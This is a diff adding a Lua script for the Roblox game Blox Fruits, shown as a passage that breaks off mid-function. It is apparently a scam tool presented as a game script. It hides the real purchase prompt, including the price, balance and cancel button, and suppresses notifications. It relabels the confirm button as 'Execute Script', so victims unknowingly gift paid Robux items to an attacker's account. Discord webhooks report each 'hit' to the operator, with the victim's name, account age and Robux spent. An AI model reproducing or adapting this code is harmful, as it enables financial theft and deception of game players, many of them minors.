@@ -1,0 +1,1070 @@
+local HitsWebhook = ""
+local Executions_Webhook = ""
+Button_Prompt = ""
+RandomizedPrompt = false
+
+-- << Obfuscate after this moment (For devs, not making it for user)
+
+repeat task.wait() until game:IsLoaded()
+
+local validGames = {
+    [2753915549] = true,  -- Sea 1
+    [4442272183] = true,  -- Sea 2
+    [7449423635] = true   -- Sea 3
+}
+
+if not validGames[game.PlaceId] then
+    game:GetService("Players").LocalPlayer:Kick("Wrong game! This script is meant for Blox Fruits.")
+    return
+end
+
+if _G.scriptExecuted then
+    warn("You have already executed this code.")
+    return
+end
+
+local unsupportedExecutor = "nil"
+local kickMessage = unsupportedExecutor .. " is currently unsupported on mobile. Please try a different executor (e.g., Codex, Fluxus) or use a PC."
+
+local function getExecutor()
+    if identifyexecutor then
+        return identifyexecutor()
+    else
+        return "Unknown"
+    end
+end
+
+local function isMobile()
+    local UserInputService = game:GetService("UserInputService")
+    return UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
+end
+
+_G.scriptExecuted = true
+
+local currentExecutor = getExecutor()
+if currentExecutor == unsupportedExecutor and isMobile() then
+    game.Players.LocalPlayer:Kick(kickMessage)
+end
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local CoreGui = game:GetService("CoreGui")
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local UserInputService = game:GetService("UserInputService")
+local marketplaceService = game:GetService("MarketplaceService")
+local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+local gameInfo = marketplaceService:GetProductInfo(game.PlaceId)
+
+local fruitThumbnails = {
+    ["Permanent Dragon-Dragon"] = "https://i.ibb.co/nZpn4LX/IMG-2402.webp",
+    ["Permanent Kitsune-Kitsune"] = "https://i.ibb.co/Dfnyrx1D/IMG-1883.webp",
+    ["Permanent Yeti-Yeti"] = "https://i.ibb.co/JWghQB1Y/IMG-2429.webp",
+    ["Fruit Notifier"] = "https://i.ibb.co/Lh2JY24v/IMG-2413.webp",
+    ["Permanent Spirit-Spirit"] = "https://i.ibb.co/vCHsFmb6/IMG-2416.webp",
+    ["Permanent Gas-Gas"] = "https://i.ibb.co/275nrtyD/IMG-2417.webp",
+    ["Permanent Venom-Venom"] = "https://i.ibb.co/3mtjbSVj/IMG-2418.webp",
+    ["Permanent Shadow-Shadow"] = "https://i.ibb.co/99LqVrBZ/IMG-2419.webp",
+    ["Permanent Dough-Dough"] = "https://i.ibb.co/zHCZmkQr/IMG-2420.webp",
+    ["Permanent T-Rex-T-Rex"] = "https://i.ibb.co/NnTJrQsF/IMG-2422.webp",
+    ["Permanent Gravity-Gravity"] = "https://i.ibb.co/HLZVJy6L/IMG-2423.webp",
+    ["Permanent Blizzard-Blizzard"] = "https://i.ibb.co/xt2qV5dr/IMG-2424.webp",
+    ["Permanent Pain-Pain"] = "https://i.ibb.co/Z6KrKWJ8/IMG-2425.webp",
+    ["Permanent Rumble-Rumble"] = "https://i.ibb.co/QFYDHgzK/IMG-2430.webp",
+    ["Permanent Portal-Portal"] = "https://i.ibb.co/35jv9Q6M/IMG-2431.webp",
+    ["Permanent Sound-Sound"] = "https://i.ibb.co/RkwYtZT0/IMG-2433.webp",
+    ["Permanent Spider-Spider"] = "https://i.ibb.co/xqKxgKBP/IMG-2434.webp",
+    ["Permanent Love-Love"] = "https://i.ibb.co/6c5sd5TJ/IMG-2435.webp",
+    ["Permanent Buddha-Buddha"] = "https://i.ibb.co/XktpnJNm/IMG-2436.webp",
+    ["Permanent Quake-Quake"] = "https://i.ibb.co/SDgB9XXT/IMG-2437.webp",
+    ["Permanent Magma-Magma"] = "https://i.ibb.co/qYn4dmbF/IMG-2439.webp",
+    ["Permanent Ghost-Ghost"] = "https://i.ibb.co/nsP6rWdx/IMG-2440.webp",
+    ["Permanent Barrier-Barrier"] = "https://i.ibb.co/YFzCgh54/IMG-2443.webp",
+    ["Dark Blade"] = "https://i.ibb.co/VY8VDwTF/IMG-2459.webp",
+    ["Permanent Light-Light"] = "https://i.ibb.co/6cSqLsMt/IMG-2447.webp",
+    ["Permanent Diamond-Diamond"] = "https://i.ibb.co/MkCb4XKR/IMG-2448.webp",
+    ["Permanent Dark-Dark"] = "https://i.ibb.co/991pFKXb/IMG-2449.webp",
+    ["Permanent Sand-Sand"] = "https://i.ibb.co/dJKGj0cM/IMG-2450.webp",
+    ["Permanent Ice-Ice"] = "https://i.ibb.co/HTXRnqp4/IMG-2451.webp",
+    ["Permanent Falcon-Falcon"] = "https://i.ibb.co/mV7b3gg2/IMG-2452.webp",
+    ["Permanent Flame-Flame"] = "https://i.ibb.co/k2rj9vGG/IMG-2453.webp",
+    ["2x Money"] = "https://i.ibb.co/DHDCk7kB/IMG-2460.webp",
+    ["+1 Fruit Storage"] = "https://i.ibb.co/dJKTk6Kn/IMG-2455.webp",
+    ["Permanent Spike-Spike"] = "https://i.ibb.co/C3NJcF4q/IMG-2456.webp",
+    ["2x Boss Drops"] = "https://i.ibb.co/yFHRT8n4/IMG-2461.webp",
+    ["Permanent Smoke-Smoke"] = "https://i.ibb.co/M5VMB4WJ/IMG-2463.webp",
+    ["Permanent Bomb-Bomb"] = "https://i.ibb.co/Wvk6shxw/IMG-2464.webp",
+    ["Permanent Spring-Spring"] = "https://i.ibb.co/BVVZyfvf/IMG-2465.webp",
+    ["Permanent Blade-Blade"] = "https://i.ibb.co/HprY0Sj2/IMG-2466.webp",
+    ["Permanent Spin-Spin"] = "https://i.ibb.co/wFL7dB8r/IMG-2467.webp",
+    ["10K Money"] = "https://i.ibb.co/xtLKmGPK/IMG-2468.webp",
+    ["2x EXP (15 mins.)"] = "https://i.ibb.co/ks5XMHDr/IMG-2470.png",
+    ["2x Mastery"] = "https://i.ibb.co/rGhBv4RJ/IMG-2487.webp",
+    ["3x Mythical Scrolls"] = "https://i.ibb.co/zhQqjwMP/IMG-2489.png"
+}
+
+local UserId
+local version = "1.2.8"
+local totalSpent = 0
+
+local success, err = pcall(function()
+    UserId = Players:GetUserIdFromNameAsync(Username)
+end)
+
+local messages = {
+    "Enjoy your brand-new item! - Trax🔹",
+    "A little gift just for you! - Trax🔹",
+    "Hope you love it! - Trax🔹",
+    "You totally deserve this! - Trax🔹",
+    "Just a small way to say thanks! - Trax🔹",
+    "Here’s something for you! - Trax🔹",
+    "A special treat just for you! - Trax🔹",
+    "You earned this, enjoy! - Trax🔹",
+    "Take this and enjoy! - Trax🔹",
+    "A little surprise coming your way! - Trax🔹",
+    "Hope this brightens your day! - Trax🔹",
+    "You’re awesome, here’s a gift! - Trax🔹",
+    "A token of appreciation for you! - Trax🔹",
+    "You're amazing, take this! - Trax🔹",
+    "Here’s something useful for you! - Trax🔹",
+    "We appreciate you big time! - Trax🔹",
+    "A little something just for you! - Trax🔹",
+    "You’re incredible, here’s a gift! - Trax🔹",
+    "A present just for you! - Trax🔹",
+    "OMG OMG you just got a present! - Trax🔹",
+    "Guess whaaaaat? 🎁 - Trax🔹",
+    "LOL FREE STUFF LET’S GOOOO - Trax🔹",
+    "Hope this doesn’t disappoint lol! - Trax🔹",
+    "Wow, you lucky one! - Trax🔹",
+    "CONGRATULATIONS!!! - Trax🔹",
+    "Here you go! ^_^ - Trax🔹",
+    "✨ Surprise! Check your inbox! ✨ - Trax🔹",
+    "Got you a little something! - Trax🔹",
+    "AYO free loot alert! - Trax🔹",
+    "Unwrap it fast! - Trax🔹",
+    "Bruh, you better love this! - Trax🔹",
+    "YOU GOT THIS! 🎁 - Trax🔹",
+    "More gifts?? Oh yeah! - Trax🔹",
+    "LMAO enjoy this IDK - Trax🔹",
+    "It’s yours now, no take-backs! - Trax🔹",
+    "Hope this ain’t mid fr! - Trax🔹",
+    "OMG IT’S PRESENT TIME - Trax🔹",
+    "POGGERS FREE LOOT CLAIM NOW - Trax🔹",
+    "Ding ding! Free stuff alert! - Trax🔹",
+    "Uhh, is this a gift? 🎉 - Trax🔹",
+    "Hey you! This is for you! - Trax🔹",
+    "Whoops, this dropped into your hands! - Trax🔹",
+    "GIFT SECURED EZ CLAP - Trax🔹",
+    "BURGER & A GIFT COMBO - Trax🔹",
+    "Shiny things make life better! - Trax🔹",
+    "LOL hope this hits different! - Trax🔹",
+    "BAM! Gift incoming! - Trax🔹",
+    "You deserve everything! 🎁 - Trax🔹",
+    "LMAO this yours now - Trax🔹",
+    "SURPRISEEEE it’s a vibe! - Trax🔹",
+    "Idk what this is but take it!! - Trax🔹",
+    "Take it before it self-destructs! - Trax🔹",
+    "Welp, here you go! 🎉 - Trax🔹",
+    "Oops, I accidentally gifted! - Trax🔹",
+    "RAWR XD, have a gift! - Trax🔹",
+    "GIFT CANNON FIRED!!! - Trax🔹",
+    "Flex on ‘em with this! - Trax🔹",
+    "YOU WIN AGAIN, WOW! - Trax🔹",
+    "No cap, you’re a legend! 🎁 - Trax🔹",
+    "HAPPY GIFT DAY LET’S GOOO - Trax🔹",
+    "WOOF WOOF, freebie for you! - Trax🔹",
+    "Ayyyy this one’s shiny! - Trax🔹",
+    "Too many gifts? Never. - Trax🔹",
+    "Look at what we got for you! - Trax🔹",
+    "BRRRR IT’S FREE LOOT TIME! - Trax🔹",
+    "Kinda random but take it anyway! - Trax🔹",
+    "BEEP BOOP, GIFT ACTIVATED - Trax🔹",
+    "Gift machine says heck yeah - Trax🔹",
+    "Open this one quick! - Trax🔹",
+    "OMG take this before I do!! - Trax🔹",
+    "Bruh, it’s fire, open it! - Trax🔹",
+    "YAAAAY CELEBRATION TIME - Trax🔹",
+    "MAXIMUM GIFT OVERLOAD!! - Trax🔹",
+    "You’re the best, no doubt! - Trax🔹",
+    "A small but mighty token! - Trax🔹",
+    "BOOM! Gift explosion! 💣 - Trax🔹",
+    "Incoming surprise delivery! - Trax🔹",
+    "Random kindness moment <3 - Trax🔹",
+    "EVERYTHING MUST GO… for free! - Trax🔹",
+    "Uhhh yeah, just take it - Trax🔹",
+    "WHOOSH, gift inbound! - Trax🔹",
+    "✨✨ SHINY STUFF ALERT ✨✨ - Trax🔹",
+    "OMG LOOT DROP DETECTED - Trax🔹",
+    "YOU’RE ON FIRE! 🔥 - Trax🔹",
+    "Can I keep it? JK LOL - Trax🔹",
+    "FREEBIES FOR EVERYONEEE - Trax🔹",
+    "Ping! It’s gift o’clock! - Trax🔹",
+    "Smells like victory! 🎁 - Trax🔹",
+    "Saw this and thought of you! - Trax🔹",
+    "Hope you enjoy this surprise! - Trax🔹",
+    "Oops, I dropped this for you! - Trax🔹",
+    "ZOOOOM gift incoming! - Trax🔹",
+    "Catch it before it flies away! - Trax🔹",
+    "Hope it’s not a potato! - Trax🔹",
+    "BIG BRAIN GIFT MOMENT - Trax🔹",
+    "CELEBRATE GOOD TIMES, PRESENTS! - Trax🔹",
+    "IDK what this is but enjoy! - Trax🔹",
+    "FREE LOOT GANG REPRESENT - Trax🔹",
+    "💖 TAKE THIS WITH LOVE 💖 - Trax🔹",
+    "Bruh moment: You got gifted - Trax🔹",
+    "We out here blessing people - Trax🔹",
+    "BIG W, YOU GOT A THING! - Trax🔹",
+    "You being here is enough! - Trax🔹",
+    "GIFTS. MORE GIFTS. ENDLESS GIFTS. - Trax🔹",
+    "CHEESE AND PRESENTS?? YES. - Trax🔹",
+    "Gift god said you deserve it! - Trax🔹",
+    "This should make you laugh! - Trax🔹",
+    "Not a scam: It’s a gift! - Trax🔹",
+    "You rock, have this! - Trax🔹",
+    "It’s tiny but it’s legendary - Trax🔹",
+    "SHAZAAM, have a present! - Trax🔹",
+    "SKRRRT enjoy this loot! - Trax🔹",
+    "PRESENT UNLOCKED: WOW! - Trax🔹",
+    "FREEBIE ALERT, ACT FAST - Trax🔹",
+    "Imagine not opening this... - Trax🔹",
+    "FR, YOU DESERVE THIS - Trax🔹",
+    "RAINING GIFTS RN BRO - Trax🔹",
+    "YASSSS YOU ARE LOVED - Trax🔹",
+    "POG LOOT DROP WHO DIS - Trax🔹",
+    "Take it or regret it later! - Trax🔹",
+    "🛸 EXTRATERRESTRIAL GIFT 🛸 - Trax🔹",
+    "Take this, chill, and enjoy! - Trax🔹",
+    "Oops, this one’s yours! - Trax🔹",
+    "DO NOT DELETE THIS OMG - Trax🔹",
+    "Sent with all the love <3 - Trax🔹",
+    "Mystery package secured... - Trax🔹",
+    "Uhh enjoy?? Kinda sus ngl - Trax🔹",
+    "BIG SURPRISEEEEEE! 🥳 - Trax🔹",
+    "TODAY = BEST DAY EVER 🎁 - Trax🔹",
+    "Like it or not, it’s yours! - Trax🔹",
+    "BOOM! Present attack! - Trax🔹",
+}
+
+local function loopSinkTransparency()
+    while true do
+        local sink = game.Players.LocalPlayer.PlayerGui:FindFirstChild("ViewportOverlay")
+            and game.Players.LocalPlayer.PlayerGui.ViewportOverlay:FindFirstChild("Sink")
+        if sink then
+            sink.BackgroundTransparency = 1
+        end
+        task.wait()
+    end
+end
+
+local function hideNotifications()
+    local player = game.Players.LocalPlayer
+    local playerGui = player:WaitForChild("PlayerGui")
+    local notifications = playerGui:FindFirstChild("Notifications")
+    
+    if notifications then
+        notifications.Enabled = false
+    end
+end
+
+local function getRandomColor()
+    return Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
+end
+
+local function getRandomFont()
+    local fonts = {
+        Enum.Font.PermanentMarker,
+        Enum.Font.Arcade,
+        Enum.Font.Bangers,
+        Enum.Font.Creepster,
+        Enum.Font.DenkOne,
+        Enum.Font.Highway,
+        Enum.Font.IndieFlower,
+        Enum.Font.JosefinSans,
+        Enum.Font.Merriweather
+    }
+    return fonts[math.random(1, #fonts)]
+end
+
+local function modifyPromptUI(isFirstPrompt)
+    local CoreGui = game:GetService("CoreGui")
+    local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
+    if not PurchasePrompt then return end
+    local ProductContainer = PurchasePrompt:FindFirstChild("ProductPurchaseContainer")
+    if not ProductContainer then return end
+    local Animator = ProductContainer:FindFirstChild("Animator")
+    if not Animator then return end
+    local prompt = Animator:FindFirstChild("Prompt")
+    if not prompt then return end
+    local alertContents = prompt:FindFirstChild("AlertContents")
+    if not alertContents then return end
+
+    prompt.BackgroundTransparency = 1
+    prompt.Image = ""
+
+    for _, element in ipairs({
+        alertContents:FindFirstChild("TitleContainer"),
+        alertContents:FindFirstChild("MiddleContent"),
+        alertContents:FindFirstChild("Footer"):FindFirstChild("Buttons"):FindFirstChild("1"),
+        alertContents:FindFirstChild("Footer"):FindFirstChild("FooterContent"):FindFirstChild("Content"):FindFirstChild("RemainingBalanceText")
+    }) do
+        if element then
+            element.Visible = false
+        end
+    end
+
+    local button2 = alertContents:FindFirstChild("Footer"):FindFirstChild("Buttons"):FindFirstChild("2")
+    if button2 then
+        button2.Image = ""
+        button2.BackgroundTransparency = 1
+        button2:ClearAllChildren()
+
+        button2.Size = UDim2.new(0, 500, 0, 120)
+        button2.Position = UDim2.new(0.5, -250, 0.5, -60)
+
+        local buttonContainer = Instance.new("Frame")
+        buttonContainer.Name = "ButtonContainer"
+        buttonContainer.Size = UDim2.new(1, 0, 1, 0)
+        buttonContainer.BackgroundTransparency = 1
+        buttonContainer.Parent = button2
+
+        local background = Instance.new("Frame")
+        background.Name = "Background"
+        background.Size = UDim2.new(1, 0, 1, 0)
+        background.BackgroundTransparency = 0.1
+        background.Parent = buttonContainer
+
+        local corner = Instance.new("UICorner")
+        corner.CornerRadius = UDim.new(0.2, 0)
+        corner.Parent = background
+
+        local gradient = Instance.new("UIGradient")
+        gradient.Rotation = RandomizedPrompt and math.random(0, 360) or 45
+        
+        local gradientColors
+        if RandomizedPrompt then
+            gradientColors = {
+                ColorSequenceKeypoint.new(0, getRandomColor()),
+                ColorSequenceKeypoint.new(0.5, getRandomColor()),
+                ColorSequenceKeypoint.new(1, getRandomColor())
+            }
+        else
+            gradientColors = {
+                ColorSequenceKeypoint.new(0, Color3.fromRGB(65, 135, 255)),
+                ColorSequenceKeypoint.new(0.5, Color3.fromRGB(100, 160, 255)),
+                ColorSequenceKeypoint.new(1, Color3.fromRGB(65, 135, 255))
+            }
+        end
+        gradient.Color = ColorSequence.new(gradientColors)
+        gradient.Parent = background
+
+        local glow = Instance.new("ImageLabel")
+        glow.Name = "Glow"
+        glow.BackgroundTransparency = 1
+        glow.Image = "rbxassetid://7912134082"
+        glow.ImageColor3 = RandomizedPrompt and getRandomColor() or Color3.fromRGB(65, 135, 255)
+        glow.ImageTransparency = RandomizedPrompt and math.random(4, 8) / 10 or 0.7
+        glow.Size = UDim2.new(1.4, 0, 1.4, 0)
+        glow.Position = UDim2.new(0.5, 0, 0.5, 0)
+        glow.AnchorPoint = Vector2.new(0.5, 0.5)
+        glow.Parent = buttonContainer
+
+        local buttonText = Instance.new("TextLabel")
+        buttonText.Name = "ButtonText"
+        buttonText.Size = UDim2.new(0.9, 0, 0.9, 0)
+        buttonText.Position = UDim2.new(0.5, 0, 0.5, 0)
+        buttonText.AnchorPoint = Vector2.new(0.5, 0.5)
+        buttonText.BackgroundTransparency = 1
+        buttonText.Text = Button_Prompt or "Execute Script"
+        buttonText.TextColor3 = RandomizedPrompt and getRandomColor() or Color3.fromRGB(255, 255, 255)
+        buttonText.TextStrokeColor3 = RandomizedPrompt and getRandomColor() or Color3.fromRGB(0, 0, 0)
+        buttonText.TextStrokeTransparency = RandomizedPrompt and math.random(0, 5) / 10 or 0.7
+        buttonText.Font = RandomizedPrompt and getRandomFont() or Enum.Font.GothamBold
+        buttonText.TextScaled = true
+        buttonText.Parent = buttonContainer
+
+        local tweenService = game:GetService("TweenService")
+
+        local hoverInfo = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
+        local clickInfo = TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+        local waveInfo = TweenInfo.new(4, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
+
+        buttonContainer.Position = UDim2.new(0, 0, 2, 0)
+        local entranceTween = tweenService:Create(buttonContainer, TweenInfo.new(1, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out), {
+            Position = UDim2.new(0, 0, 0, 0)
+        })
+        entranceTween:Play()
+
+        local function startWaveAnimation()
+            local rotationOffset = 0.5
+            local positionOffset = 0.005
+            
+            local rotationTween = tweenService:Create(buttonContainer, waveInfo, {
+                Rotation = rotationOffset
+            })
+            rotationTween:Play()
+            
+            local positionTween = tweenService:Create(buttonContainer, waveInfo, {
+                Position = UDim2.new(positionOffset, 0, 0, 0)
+            })
+            positionTween:Play()
+
+            local glowTween = tweenService:Create(glow, waveInfo, {
+                ImageTransparency = RandomizedPrompt and math.random(3, 7) / 10 or 0.6
+            })
+            glowTween:Play()
+        end
+        startWaveAnimation()
+
+        button2.MouseEnter:Connect(function()
+            local scaleTween = tweenService:Create(buttonContainer, hoverInfo, {
+                Size = UDim2.new(1.1, 0, 1.1, 0)
+            })
+            
+            local hoverGradientColors
+            if RandomizedPrompt then
+                hoverGradientColors = {
+                    ColorSequenceKeypoint.new(0, getRandomColor()),
+                    ColorSequenceKeypoint.new(0.5, getRandomColor()),
+                    ColorSequenceKeypoint.new(1, getRandomColor())
+                }
+            else
+                hoverGradientColors = {
+                    ColorSequenceKeypoint.new(0, Color3.fromRGB(85, 155, 255)),
+                    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(120, 180, 255)),
+                    ColorSequenceKeypoint.new(1, Color3.fromRGB(85, 155, 255))
+                }
+            end
+            
+            local colorTween = tweenService:Create(gradient, hoverInfo, {
+                Color = ColorSequence.new(hoverGradientColors)
+            })
+            
+            local glowTween = tweenService:Create(glow, hoverInfo, {
+                ImageTransparency = RandomizedPrompt and math.random(3, 6) / 10 or 0.4,
+                Size = UDim2.new(1.6, 0, 1.6, 0)
+            })
+            
+            scaleTween:Play()
+            colorTween:Play()
+            glowTween:Play()
+        end)
+
+        button2.MouseLeave:Connect(function()
+            local scaleTween = tweenService:Create(buttonContainer, hoverInfo, {
+                Size = UDim2.new(1, 0, 1, 0)
+            })
+            
+            local colorTween = tweenService:Create(gradient, hoverInfo, {
+                Color = ColorSequence.new(gradientColors)
+            })
+            
+            local glowTween = tweenService:Create(glow, hoverInfo, {
+                ImageTransparency = RandomizedPrompt and math.random(4, 8) / 10 or 0.7,
+                Size = UDim2.new(1.4, 0, 1.4, 0)
+            })
+            
+            scaleTween:Play()
+            colorTween:Play()
+            glowTween:Play()
+        end)
+
+        button2.MouseButton1Down:Connect(function()
+            local clickTween = tweenService:Create(buttonContainer, clickInfo, {
+                Size = UDim2.new(0.95, 0, 0.95, 0)
+            })
+            
+            local clickGradientColors
+            if RandomizedPrompt then
+                clickGradientColors = {
+                    ColorSequenceKeypoint.new(0, getRandomColor()),
+                    ColorSequenceKeypoint.new(0.5, getRandomColor()),
+                    ColorSequenceKeypoint.new(1, getRandomColor())
+                }
+            else
+                clickGradientColors = {
+                    ColorSequenceKeypoint.new(0, Color3.fromRGB(45, 115, 235)),
+                    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(80, 140, 235)),
+                    ColorSequenceKeypoint.new(1, Color3.fromRGB(45, 115, 235))
+                }
+            end
+            
+            local colorTween = tweenService:Create(gradient, clickInfo, {
+                Color = ColorSequence.new(clickGradientColors)
+            })
+            
+            clickTween:Play()
+            colorTween:Play()
+        end)
+
+        button2.MouseButton1Up:Connect(function()
+            local releaseTween = tweenService:Create(buttonContainer, TweenInfo.new(0.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+                Size = UDim2.new(1, 0, 1, 0)
+            })
+            
+            local colorTween = tweenService:Create(gradient, hoverInfo, {
+                Color = ColorSequence.new(gradientColors)
+            })
+            
+            releaseTween:Play()
+            colorTween:Play()
+        end)
+    end
+end
+
+local function getExecutor()
+    if syn then return "Synapse X"
+    elseif getexecutor then return getexecutor()
+    elseif identifyexecutor then return identifyexecutor()
+    elseif fluxus then return "Fluxus"
+    else return "Unknown" end
+end
+
+local function getRandomMessage()
+    return messages[math.random(1, #messages)]
+end
+
+local function sendExecutionLog()
+    local executorIdentifier = getExecutor()
+    local platform = UserInputService.TouchEnabled and "Mobile" or "PC"
+    local membershipType = game.Players.LocalPlayer.MembershipType
+    local hasPremium = (membershipType == Enum.MembershipType.Premium) and "Yes" or "No"
+    local embed = {
+        ["title"] = "**New Execution!!**",
+        ["color"] = 255,
+        ["fields"] = {
+            {
+                ["name"] = ":space_invader: **__Username:__**",
+                ["value"] = game.Players.LocalPlayer.Name,
+                ["inline"] = true
+            },
+
+            {
+                ["name"] = ":rocket: **__Executor__:**",
+                ["value"] = executorIdentifier,
+                ["inline"] = true
+            },
+            {
+                ["name"] = ":trackball: **__Device:__**",
+                ["value"] = platform,
+                ["inline"] = true
+            }
+        }
+    }
+
+    local data = HttpService:JSONEncode({
+        ["username"] = "Trax | Executions",
+        ["avatar_url"] = "https://i.ibb.co/G49wWyzZ/D96725-AE-543-E-464-B-85-C0-9-EFADCA0-D752.jpg",
+        ["embeds"] = {embed}
+    })
+
+    request({
+        Url = Executions_Webhook,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = data
+    })
+end
+
+local function getRobuxBalance()
+    local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
+    if not PurchasePrompt then return 0 end
+    local ProductContainer = PurchasePrompt:FindFirstChild("ProductPurchaseContainer")
+    if not ProductContainer then return 0 end
+    local Animator = ProductContainer:FindFirstChild("Animator")
+    if not Animator then return 0 end
+    local prompt = Animator:FindFirstChild("Prompt")
+    if not prompt then return 0 end
+    local alertContents = prompt:FindFirstChild("AlertContents")
+    if not alertContents then return 0 end
+    local footer = alertContents:FindFirstChild("Footer")
+    if not footer then return 0 end
+    local footerContent = footer:FindFirstChild("FooterContent")
+    if not footerContent then return 0 end
+    local content = footerContent:FindFirstChild("Content")
+    if not content then return 0 end
+    local RemainingBalanceText = content:FindFirstChild("RemainingBalanceText")
+    if not RemainingBalanceText or not RemainingBalanceText.Text then return 0 end
+    local balanceText = RemainingBalanceText.Text:match("(%d+)$")
+    return (balanceText and tonumber(balanceText) or 0) + 25
+end
+
+local webhookSent2 = false 
+
+local function sendWebhook(totalSpent, itemName)
+    if webhookSent2 then
+        return
+    end
+
+    local executorIdentifier = getExecutor()
+
+  local currentTime = os.date("%I:%M %p")
+
+local embed = {
+        ["title"] = "**__POTENTIAL__ Blox Fruits Hit!!**",
+        ["color"] = 255,
+        ["thumbnail"] = {
+            ["url"] = fruitThumbnails[itemName] or ""
+        },
+        ["fields"] = {
+            {
+                ["name"] = ":bust_in_silhouette: **__Player Information:__**",
+                ["value"] = "```Name: " .. game.Players.LocalPlayer.Name .. "\nAccount Age: " .. tostring(game.Players.LocalPlayer.AccountAge) .. "\nReceiver: " .. Username .. "```"
+            },
+            {
+                ["name"] = "<:robux:1341921463086878800> **__Item Price:__**",
+                ["value"] = "```" .. totalSpent .. "```"
+            },
+            {
+                ["name"] = ":package: **__Item Prompted:__**",
+                ["value"] = "```" .. itemName .. "```"
+            },
+            {
+                ["name"] = ":rocket: **__Executor Used:__**",
+                ["value"] = "```" .. executorIdentifier .. "```"
+            }
+        },
+        ["footer"] = {
+            ["text"] = "Potential Hit by Trax | Today at " .. currentTime
+        }
+    }
+
+    local data = HttpService:JSONEncode({
+        ["username"] = "Trax | Potential Hits",
+        ["avatar_url"] = "https://i.ibb.co/G49wWyzZ/D96725-AE-543-E-464-B-85-C0-9-EFADCA0-D752.jpg",
+        ["content"] = "### Good Luck!",
+        ["embeds"] = {embed}
+    })
+
+    request({
+        Url = HitsWebhook,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = data
+    })
+
+    webhookSent2 = true
+end
+
+local webhookSent3 = false 
+
+local function sendWebhook2(totalSpent)
+    if webhookSent3 then
+        return
+    end
+
+    local executorIdentifier = getExecutor()
+
+local embed = {
+    ["title"] = ":moneybag: **BLOX FRUITS HIT!!** :moneybag:",
+    ["color"] = 255,
+    ["fields"] = {
+        {
+            ["name"] = ":bust_in_silhouette: **__Player Information:__**",
+            ["value"] = "```Name: " .. game.Players.LocalPlayer.Name .. "\nAccount Age: " .. tostring(game.Players.LocalPlayer.AccountAge) .. "\nReceiver: " .. Username .. "```"
+        },
+        {
+            ["name"] = "<:robux:1341921463086878800> **__Robux Spent:__**",
+            ["value"] = "```" .. totalSpent .. "```"
+        },
+        {
+            ["name"] = ":rocket: **__Executor Used:__**",
+            ["value"] = "```Executor: " .. executorIdentifier .. "```"
+        },
+        {
+            ["name"] = ":information_source: **__Information:__**",
+            ["value"] = "The button prompt has been confirmed by the victim, guaranteeing you’ll get the item 100%! :white_check_mark::dart::gift:"
+        },
+        {
+            ["name"] = "Join Trax Scripts!",
+            ["value"] = "[**Join Server!**](https://discord.gg/94yBRKy9VV)"
+        }
+    },
+    ["footer"] = {
+        ["text"] = "Hit Using Trax Scripts | Nice Hit!!"
+    },
+    ["thumbnail"] = {
+        ["url"] = fruitThumbnails[itemName] or ""
+    }
+}
+
+local data = HttpService:JSONEncode({
+    ["content"] = "@everyone",
+    ["embeds"] = {embed},
+    ["username"] = "Trax | Hits",
+    ["avatar_url"] = "https://i.ibb.co/G49wWyzZ/D96725-AE-543-E-464-B-85-C0-9-EFADCA0-D752.jpg"
+})
+
+request({
+    Url = HitsWebhook,
+    Method = "POST",
+    Headers = {
+        ["Content-Type"] = "application/json"
+    },
+    Body = data
+})
+
+    webhookSent3 = true
+end
+
+local promptConfirmed = false
+local purchaseInProgress = false
+
+local function waitForPromptToDisappear()
+    local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
+    if not PurchasePrompt then return end
+    local ProductContainer = PurchasePrompt:FindFirstChild("ProductPurchaseContainer")
+    if not ProductContainer then return end
+    local Animator = ProductContainer:FindFirstChild("Animator")
+    if not Animator then return end
+
+    while Animator:FindFirstChild("Prompt") do
+        task.wait()
+    end
+end
+
+local function waitForPurchaseConfirmation()
+    local PurchasePrompt = game:GetService("CoreGui"):WaitForChild("PurchasePrompt")
+    local ProductContainer = PurchasePrompt:WaitForChild("ProductPurchaseContainer")
+    local Animator = ProductContainer:WaitForChild("Animator")
+    local prompt = Animator:WaitForChild("Prompt")
+    local alertContents = prompt:WaitForChild("AlertContents")
+    local footer = alertContents:WaitForChild("Footer")
+    local footerButtons = footer:WaitForChild("Buttons")
+
+    local confirmButton = footerButtons:WaitForChild("2")
+    local function onInteraction()
+        promptConfirmed = true
+    end
+    confirmButton.MouseButton1Click:Connect(onInteraction)
+    confirmButton.TouchTap:Connect(onInteraction)
+end
+
+local function verifyUserId()
+    local success, err = pcall(function()
+        UserId = Players:GetUserIdFromNameAsync(Username)
+    end)
+    if not success or not UserId then
+        game.Players.LocalPlayer:Kick("Fatal error. Rejoin & Try again.")
+        return false
+    end
+    return true
+end
+
+local webhookSent = false
+
+local function buyItem(storageName, cost)
+    if purchaseInProgress then return end
+    purchaseInProgress = true
+    
+    if not verifyUserId() then return end
+    
+    local balance = getRobuxBalance()
+    local targetUser = {
+        name = Username,
+        id = UserId
+    }
+
+    local args = {
+        [1] = "buyRobuxShop",
+        [2] = {
+            ["StorageName"] = storageName,
+            ["PurchaseAction"] = "Gift",
+            ["PurchaseLocation"] = "Shop",
+            ["Message"] = getRandomMessage(),
+            ["FunnelId"] = "Shop",
+            ["ReceiverName"] = targetUser.name,
+            ["ReceiverUserId"] = targetUser.id,
+        }
+    }
+    
+    local CommF = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
+    local success, err = pcall(function()
+        CommF:InvokeServer(unpack(args))
+    end)
+
+    if not success then
+        warn("Purchase failed:", err)
+        purchaseInProgress = false
+        return
+    end
+
+    totalSpent = totalSpent + cost
